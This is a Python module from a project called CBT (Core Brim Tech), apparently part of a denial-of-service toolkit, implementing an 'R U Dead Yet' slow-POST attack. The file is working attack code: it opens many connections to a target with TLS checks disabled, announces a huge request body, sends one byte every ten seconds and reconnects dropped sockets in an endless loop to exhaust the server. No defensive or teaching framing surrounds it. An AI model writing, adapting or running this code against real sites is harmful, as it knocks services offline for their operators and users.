#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

You should have received a copy of the GNU General Public License along
with CBT; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, ssl, time, threading
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse

# CBT R U Dead Yet (RUDY) - Slow POST attack
def setupRudySocket(self, target):
    if target.startswith('http://'):
        target = target.replace('http://','')
        port = 80
    elif target.startswith('https://'):
        target = target.replace('https://','')
        port = 443
    else:
        port = 80
    
    self.user_agent = random.choice(self.agents).strip()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(300)  # Long timeout for slow POST
    
    if port == 443:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(sock, server_hostname=target)
    
    try:
        sock.connect((target, port))
        # Send POST headers slowly
        post_headers = "POST / HTTP/1.1\r\n"
        post_headers += "Host: " + str(target) + "\r\n"
        post_headers += "User-Agent: " + str(self.user_agent) + "\r\n"
        post_headers += "Content-Type: application/x-www-form-urlencoded\r\n"
        post_headers += "Content-Length: 1000000\r\n"  # Large content length
        post_headers += "Connection: keep-alive\r\n"
        post_headers += "\r\n"
        
        sock.sendall(post_headers.encode('utf-8'))
        return sock, target
    except:
        return None, target

def rudyize(self, target, requests):
    n=0
    self.sockets = []
    try:
        for i in range(requests):
            n=n+1
            try:
                sock, target = setupRudySocket(self, target)
                if sock:
                    print("[Info] [AI] [RUDY] Firing 'slow POST' ["+str(n)+"] -> [CONNECTED!]")
                    self.sockets.append(sock)
            except:
                print("[Error] [AI] [RUDY] Failed to engage with 'slow POST' ["+str(n)+"]")
        
        # Send data very slowly (one byte at a time)
        while True:
            for sock in list(self.sockets):
                try:
                    # Send one byte every 10 seconds
                    sock.send(b'A')
                    time.sleep(10)
                except socket.error:
                    self.sockets.remove(sock)
            # Reconnect closed sockets
            for i in range(requests - len(self.sockets)):
                print("[Info] [AI] [RUDY] Re-opening closed 'slow POST' -> [RE-LINKED!]")
                sock, target = setupRudySocket(self, target)
                if sock:
                    self.sockets.append(sock)
    except:
        print("[Error] [AI] [RUDY] Failing to engage... -> Is still target online? -> [Checking!]")

class RUDY(object):
    def __init__(self):
        self.sockets = []
        self.agents_file = 'core/txt/user-agents.txt'
        self.agents = []
        f = open(self.agents_file)
        agents = f.readlines()
        f.close()
        for agent in agents:
            self.agents.append(agent)

    def attacking(self, target, requests):
        print("[Info] [AI] R U Dead Yet (RUDY) is ready to fire: [" , requests, "slow POSTs ]")
        rudyize(self, target, requests)
